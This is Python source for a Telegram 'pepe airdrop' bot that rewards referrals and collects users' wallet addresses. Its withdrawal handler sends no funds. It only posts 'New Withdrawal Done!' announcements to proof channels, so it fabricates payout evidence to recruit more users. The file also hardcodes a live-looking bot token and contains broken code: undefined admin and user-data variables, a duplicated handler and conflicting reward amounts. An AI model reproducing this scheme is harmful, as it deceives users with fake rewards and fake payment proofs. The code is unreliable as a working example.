import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
import time

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
BOT_TOKEN = '7341976321:AAFCgrN4EKWOXu5iGQKY6nI3uUgDGxv_ldc'
bot = telebot.TeleBot(BOT_TOKEN)

# Image URLs
image_url = "https://t.me/abir_x_official_developer/58"
pepe_address_image_url = "https://t.me/abir_x_official_developer/62"
invite_image_url = "https://t.me/abir_x_official_developer/56"
withdraw_error_image_url = "https://t.me/abir_x_official_developer/55"

# Admin IDs
ADMIN_USER_IDS = [123456789, 7303810912]  # Replace with actual admin user IDs

# Channels and Groups
CONFIRM_CHANNEL_ID = -1002113563800
GROUP_ID = -1002263161625

# Required channels
required_channels = [
    ("Main Channel", "@ModVipRM"),
    ("Mod Channel", "@modDirect_download"),
    ("Backup Channel", "@ModviprmBackup"),
    ("Payment Channel", "@Proofchannelch"),
]

# Simulated database
user_referrals = {}  # Format: {user_id: [{'username': ..., 'pepe_address': ...}]}
total_users = set()  # Store unique users to count total members
user_pepe_addresss = {}  # Format: {user_id: pepe_address}
user_submit_time = {}  # {user_id: timestamp of last pepe address submission attempt}
user_withdraw_time = {}  # {user_id: timestamp of last successful withdrawal}
# User database (Simulated)
user_database = set()  # To keep track of all users who have interacted with the bot    

# Utility function to check admin
def is_admin(user_id):
    return user_id in ADMIN_IDS



def get_user_balance(user_id):
    """Calculate user's balance based on fully completed referrals."""
    referral_data = user_referrals.get(user_id, [])
    # Only count referrals that have a valid Pepe address
    completed_referrals = [r for r in referral_data if r["pepe_address"]]
    balance = len(completed_referrals) * 0.0003  # Adds 0.0003 for each completed referral
    return round(balance, 4)


def get_referral_data(user_id):
    """Fetch referral data for a user."""
    return user_referrals.get(user_id, [])


def is_user_verified(user_id):
    """Check if user has joined all required channels."""
    for _, channel_username in required_channels:
        try:
            member_status = bot.get_chat_member(channel_username, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception as e:
            print(f"Error checking channel {channel_username}: {e}")
            return False
    return True


def notify_referrer_of_click(referrer_id, new_username):
    """Notify the referrer when a new user clicks their referral link."""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🗓 Show Balance", callback_data="withdraw"))

    bot.send_photo(
        chat_id=referrer_id,
        photo=invite_image_url,
        caption=(
            f"🎉 New User Clicked on Your Shared Referral Link!\n\n"
            f"👤 Referral Username: @{new_username}\n"
            "⚠️ Reward only if the referral completes all tasks and submits their Pepe Address."
        ),
        reply_markup=keyboard,
    )



@bot.message_handler(commands=['start'])
def start_command(message):
    """Handle the /start command."""
    user_id = message.from_user.id
    referral_source = message.text.split()[1] if len(message.text.split()) > 1 else None

    # Add the user to the total_users set
    total_users.add(user_id)

    # Process referral logic
    if referral_source and referral_source.isdigit() and int(referral_source) != user_id:
        referrer_id = int(referral_source)

        # Initialize referrer's referral list if not present
        if referrer_id not in user_referrals:
            user_referrals[referrer_id] = []

        # Check if the user is already referred by this referrer
        existing_referral = next(
            (referral for referral in user_referrals[referrer_id] if referral["username"] == message.from_user.username),
            None
        )

        # Add new referral if not existing
        if not existing_referral:
            user_referrals[referrer_id].append({"username": message.from_user.username, "pepe_address": False, "channels_joined": False})
            notify_referrer_of_click(referrer_id, message.from_user.username)

    # Send the start message
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("Next Step -> Withdraw", callback_data="withdraw"))

    caption = (
        "✅ pepe Airdrop Live!\n\n"
        "💰 Total pool: 10000 $pepe\n"
        "👥 Referral reward: 0.0024 $pepe\n"
        "🎁 Login reward: 0.0003 $pepe\n"
        "📜 Mission reward: Up to 0.1 $pepe\n"
        "💸 Withdraw min: 0.0003 $pepe\n"
        "🔴 Live payments: @live_payments_peperef\n\n"
        "🪫 Complete all these airdrop tasks in order from 1 to 4 to get $pepe reward:\n\n"
        + "\n".join([f"{i+1}️⃣ 👉 [{name}](https://t.me/{link[1:]})" for i, (name, link) in enumerate(required_channels)]),
        "\n\nAfter completing all, please click on the *Next Step* button to withdraw your $pepe."
    )

    bot.send_photo(
        chat_id=message.chat.id,
        photo=image_url,
        caption=caption,
        parse_mode="Markdown",
        reply_markup=keyboard,
    )

@bot.message_handler(func=lambda message: message.text and len(message.text) == 42 and message.text.isalnum())
def save_pepe_address(message):
    """Save Pepe Address and notify referrer if applicable."""
    user_id = message.from_user.id
    pepe_address = message.text

    # Check if Pepe Address has already been used
    if pepe_address in user_pepe_addresss.values():
        bot.send_message(
            chat_id=message.chat.id,
            text="❌ This Pepe Address has already been used. Please provide a unique address.",
        )
        return

    # Check if the user has joined all required channels
    if not is_user_verified(user_id):
        bot.send_message(
            chat_id=message.chat.id,
            text="❌ You must join all required channels to proceed. Please join the channels and try again.",
        )
        return

    # Save Pepe Address
    user_pepe_addresss[user_id] = pepe_address

    # Notify referrer if the user is a referral
    for referrer_id, referrals in user_referrals.items():
        for referral in referrals:
            if referral["username"] == message.from_user.username and not referral["pepe_address"]:
                # Mark referral as complete
                referral["pepe_address"] = True

                # Reward the referrer
                referral_reward = 0.003

                # Notify the referrer about successful completion with image and button
                bot.send_photo(
                    chat_id=referrer_id,
                    photo=invite_image_url,
                    caption=(
                        f"🎉 Congratulations! Your referral @{message.from_user.username} has successfully completed the process.\n"
                        f"💰 You earned: {referral_reward} $pepe.\n"
                        "Keep inviting more friends to earn additional rewards!"
                    ),
                    reply_markup=InlineKeyboardMarkup().add(
                        InlineKeyboardButton("🗓 Show Balance", callback_data="withdraw")
                    )
                )

    bot.send_message(
        chat_id=message.chat.id,
        text="✅ Your Pepe Address has been saved successfully. You can now proceed to withdraw or check your balance.",
    )


@bot.callback_query_handler(func=lambda call: call.data == "withdraw")
def withdraw_step(call):
    """Handle the 'Withdraw' Button."""
    user_id = call.from_user.id

    # Check if the user has joined required channels
    if not is_user_verified(user_id):
        bot.send_message(
            chat_id=call.message.chat.id,
            text="❌ You must join all required channels to proceed.\nPlease join the channels and try again.",
        )
        start_command(call.message)  # Redirect to joining channels
        return

    # Check if pepe Address is set
    if user_id not in user_pepe_addresss:
        ask_for_pepe_address(call.message.chat.id)  # Prompt the user to provide pepe Address
        return

    # Proceed to withdrawal options
    balance = get_user_balance(user_id)
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💰 Balance", callback_data="withdraw"),
        InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_balance"),
    )
    keyboard.add(
        InlineKeyboardButton("📜 Statistics", callback_data="stats"),
        InlineKeyboardButton("🤝 Invite Friends", callback_data="invite"),
    )
    keyboard.add(
        InlineKeyboardButton("📢 News", url="https://t.me/ModVipRm"),
        InlineKeyboardButton("🔴 Payments", url="https://t.me/Proofchannelch"),
    )

    bot.send_photo(
        chat_id=call.message.chat.id,
        photo=image_url,
        caption=(
            f"✅ Balance: {balance} $pepe\n\n"
            "🎁 Earn more $pepe by inviting friends or completing missions.\n"
            "Choose an option below:"
        ),
        reply_markup=keyboard,
    )

@bot.message_handler(func=lambda message: message.text and len(message.text) == 42 and message.text.isalnum())
def save_pepe_address(message):
    """Save Pepe Address and notify referrer if applicable."""
    user_id = message.from_user.id
    pepe_address = message.text

    # Check if Pepe Address has already been used
    if pepe_address in user_pepe_addresss.values():
        bot.send_message(
            chat_id=message.chat.id,
            text="❌ This Pepe Address has already been used. Please provide a unique address.",
        )
        return

    # Save Pepe Address
    user_pepe_addresss[user_id] = pepe_address

    # Notify referrer if the user is a referral
    for referrer_id, referrals in user_referrals.items():
        for referral in referrals:
            if referral["username"] == message.from_user.username and not referral["pepe_address"]:
                referral["pepe_address"] = True

                # Referral reward
                referral_reward = 0.0024

                # Notify the referrer about successful completion
                bot.send_photo(
                    chat_id=referrer_id,
                    photo=invite_image_url,
                    caption=(
                        f"🎉 Congratulations! Your referral @{message.from_user.username} has successfully completed the process.\n"
                        f"💰 You earned: {referral_reward} $pepe.\n"
                        "Keep inviting more friends to earn additional rewards!"
                    )
                )

    # Notify the user that their Pepe Address has been saved successfully
    bot.send_message(
        chat_id=message.chat.id,
        text="✅ Your Pepe Address has been saved successfully. You can now proceed to withdraw or check your balance.",
    )

    # Proceed to withdraw step

@bot.callback_query_handler(func=lambda call: call.data == "withdraw_balance")
def process_withdraw(call):
    """Handle the actual withdrawal process."""
    user_id = call.from_user.id
    balance = get_user_balance(user_id)

    if balance < 0.0003:
        # Insufficient balance
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="withdraw"))

        bot.send_photo(
            chat_id=call.message.chat.id,
            photo=withdraw_error_image_url,
            caption=(
                "❌ Your balance is below the minimum required for withdrawal (0.0003 pepe).\n\n"
                "Earn more by completing tasks or inviting friends."
            ),
            reply_markup=keyboard,
        )
    else:
# Sufficient balance, prepare withdrawal
        pepe_address = user_pepe_addresss.get(user_id, "No pepe Address provided.")  # Use `.get()` for safe access
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton("✅ Confirm", callback_data="confirm_withdraw"),
            InlineKeyboardButton("🔙 Back", callback_data="withdraw"),
        )

        bot.send_photo(
            chat_id=call.message.chat.id,
            photo=withdraw_error_image_url,
            caption=(
                f"👏 You want to request a withdrawal of:\n\n"
                f"🤩 Amount: {balance} pepe\n\n"
                f"🏘 Address:\nEQD5mxRgCuRNLxKxeOjG6r14iSroLF5FtomPnet-sgP5xNJb\n"
                f"pepe Address: {pepe_address}\n\n"
                "Click the Confirm Button to proceed."
            ),
            reply_markup=keyboard,
        )


@bot.callback_query_handler(func=lambda call: call.data == "confirm_withdraw")
def confirm_withdraw(call):
    """💳 Handle withdrawal confirmation 💳"""
    user_id = call.from_user.id
    balance = get_user_balance(user_id)
    pepe_address = user_pepe_addresss.get(user_id, "🚫 No pepe Address provided.")  # Use `.get()` for safe access

    # 🕒 Check if the user is within the 24-hour cooldown period
    if user_id in user_withdraw_time and time.time() - user_withdraw_time[user_id] < 86400:
        remaining_time = 86400 - int(time.time() - user_withdraw_time[user_id])
        bot.answer_callback_query(
            call.id,
            f"❌ You can only withdraw once every 24 hours.\n⏳ Try again in {remaining_time // 3600} hours and {(remaining_time % 3600) // 60} minutes.",
            show_alert=True
        )
        return

    if balance >= 0.0003:
        # ✅ Deduct the balance and update withdrawal timestamp
        user_referrals[user_id] = user_referrals.get(user_id, [])[:-int(balance / 0.0003)]
        user_withdraw_time[user_id] = time.time()  # Update last withdrawal time

        # 🔔 Notify the user
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=(
                "✅ **Your withdrawal request has been sent.**\n\n"
                f"🤩 **Amount:** {balance} pepe\n\n"
                f"🏘 **Address:**\nEQD5mxRgCuRNLxKxeOjG6r14iSroLF5FtomPnet-sgP5xNJb\n"
                f"📬 **Pepe Address:** {pepe_address}\n\n"
                "🔗 @Proofchannelch"
            ),
        )

        # 📢 Forward request to the specified channel and group
        caption = (
            "📥 **New Withdrawal Done!** 📥\n"
            f"👷‍♂️ **Username:** @{call.from_user.username}\n"
            f"💥 **Amount:** {balance} pepe\n"
            f"🗃 **Pepe Address:** {pepe_address}\n\n"
            "💵 **Earn Free Pepe From Our Bot!**\n"
            "😎 Why are you late? Join now! 🔥\n"
            "Per referral, earn **0.003 Pepe**\n"
            "For updates, join @ModVipRM ✔️"
        )
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("🤩 Join Now And Get Money 🫠", url="https://t.me/pepe_payment_airdrop_bot"))

        # 📬 Forward to the channel and group
        bot.send_message(CONFIRM_CHANNEL_ID, text=caption, reply_markup=keyboard)
        bot.send_message(GROUP_ID, text=caption, reply_markup=keyboard)

    else:
        # 🚫 Handle insufficient balance
        bot.answer_callback_query(
            call.id, "❌ Insufficient balance.\n💼 Please earn more before withdrawing.", show_alert=True
        )

@bot.callback_query_handler(func=lambda call: call.data == "stats")
def show_statistics(call):
    """Show bot live statistics."""
    total_users_count = len(total_users)  # Total unique users
    bot.send_message(
        chat_id=call.message.chat.id,
        text=(
            "➠ 📊 ｢Bot Live Statistics 」 📊\n"
            "┏━━━━━━━━━━━━━━━━━━━\n"
            f"┣💡 Total Users: {total_users_count}\n"
            "┣━━━━━━━━━━━━━━━━━━━\n"
            "┣✅ Bot Source Code:  @abirxdhackz 📨\n"
            "┗━━━━━━━━━━━━━━━━━━━\n\n"
            "📛 ᴠᴇʀꜱɪᴏɴ : Latest\n\n"
            "🟢 ʟᴀꜱᴛ ᴜʙᴅᴀᴛᴇ 4 Dec ,2024\n\n"
            "👑 ʙᴏᴛ ᴄʀᴇᴀᴛᴏʀ : @abirxdhackz\n\n"
            "❤️ ᴊᴏɪɴ ᴏᴜʀ ᴄᴏᴅɪɴɢ ᴄʜᴀɴɴᴇʟ ꜰᴏʀ ᴍᴏʀᴇ ʙᴏᴛꜱ : @ModVipRM"
        ),
    )

@bot.callback_query_handler(func=lambda call: call.data == "invite")
def invite_function(call):
    """Handle Invite Button."""
    user_id = call.from_user.id
    referral_data = get_referral_data(user_id)
    referral_link = f"https://t.me/pepe_payment_airdrop_bot?start={user_id}"

    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="withdraw"))
    keyboard.add(InlineKeyboardButton("List of Referrals", callback_data="referrals"))

    bot.send_photo(
        chat_id=call.message.chat.id,
        photo=invite_image_url,
        caption=(
            f"🥳 Your total refers: {len(referral_data)} User(s)\n"
            f" ↳ Complete All Task: {len([r for r in referral_data if r['pepe_address']])} User(s)\n\n"
            f"🙌 Your Invite Link: {referral_link}\n\n"
            "🪢 Invite to earn 0.0024 $pepe each invite and your friend earns 0.0003 $pepe.\n"
            " ↳ You will get an additional 0.001 $pepe per mission your friends complete."
        ),
        reply_markup=keyboard,
    )

# Admin command to add balance
@bot.message_handler(commands=['balanceadd'])
def balance_add_handler(message):
    if message.from_user.id not in ADMIN_USER_IDS:
        bot.send_message(message.chat.id, "⚠️ You don't have permission to use this command.")
        return

    # Ask for the amount and user ID to add balance
    msg = bot.send_message(message.chat.id, "Please enter the amount of points and user ID in this format:\n\n`points user_id`", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_balance_add)

# Process the balance add input from the admin
def process_balance_add(message):
    try:
        # Split input into points and user ID
        points, user_id = map(str.strip, message.text.split())
        points = int(points)
        user_id = int(user_id)

        # Ensure the user ID exists in user_data, initialize if missing
        if user_id not in user_data:
            user_data[user_id] = {'balance': 0, 'invited_users': 0, 'bonus_claimed': False}

        # Add points to the user's balance
        user_data[user_id]['balance'] += points
        bot.send_message(message.chat.id, f"✅ Successfully added {points} points to user {user_id}'s balance.")
        bot.send_message(user_id, f"🎉 You have received {points} points! Your new balance is {user_data[user_id]['balance']} points.")

    except ValueError:
        bot.send_message(message.chat.id, "⚠️ Invalid input format. Please use the format `points user_id` (e.g., `10 123456789`).")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ An error occurred: {e}")

# Admin command to broadcast a message
@bot.message_handler(commands=['broadcast'])
def broadcast_handler(message):
    if message.from_user.id not in ADMIN_USER_IDS:
        bot.send_message(message.chat.id, "⚠️ You don't have permission to use this command.")
        return

    # Ask for the message to broadcast
    msg = bot.send_message(message.chat.id, "Please enter the message or send the file to broadcast.")
    bot.register_next_step_handler(msg, process_broadcast)

# Process the broadcast message or file
def process_broadcast(message):
    # Broadcast the received message to all users in total_users
    for user_id in total_users:
        try:
            # Check if the message contains text, photo, document, or video to broadcast
            if message.content_type == 'text':
                bot.send_message(user_id, message.text)
            elif message.content_type == 'photo':
                bot.send_photo(user_id, message.photo[-1].file_id, caption=message.caption)
            elif message.content_type == 'document':
                bot.send_document(user_id, message.document.file_id, caption=message.caption)
            elif message.content_type == 'video':
                bot.send_video(user_id, message.video.file_id, caption=message.caption)
        except Exception as e:
            print(f"Could not send message to {user_id}: {e}")

    # Notify the admin that the broadcast was successful
    bot.send_message(message.chat.id, "✅ Broadcast sent to all users.")

@bot.callback_query_handler(func=lambda call: call.data == "referrals")
def list_referrals(call):
    """Show the list of referrals for the user."""
    user_id = call.from_user.id
    referral_data = get_referral_data(user_id)

    if not referral_data:
        bot.send_message(
            chat_id=call.message.chat.id,
            text="❌ You don't have any referrals yet.\nInvite friends to earn rewards!"
        )
        return

    referral_list = []
    for i, referral in enumerate(referral_data, start=1):
        referral_list.append(
            f"Referral {i}:\n"
            f" ↳ Username: @{referral['username']}\n"
            f" ↳ Enter pepe Address: {'✅' if referral['pepe_address'] else '❌'}"
        )

    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="withdraw"))

    bot.send_message(
        chat_id=call.message.chat.id,
        text="\n\n".join(referral_list),
        reply_markup=keyboard,
    )


def ask_for_pepe_address(chat_id):
    """Prompt user for their pepe Address."""
    bot.send_photo(
        chat_id=chat_id,
        photo=pepe_address_image_url,
        caption=(
            "🏧 Enter your pepe Address code to prepare for withdrawal.\n\n"
            "ℹ️ Your pepe Address is a unique 42 digit Character you can get from your pepe wallet."
        )
    )


# Start the bot
print("Bot is running...")
bot.infinity_polling()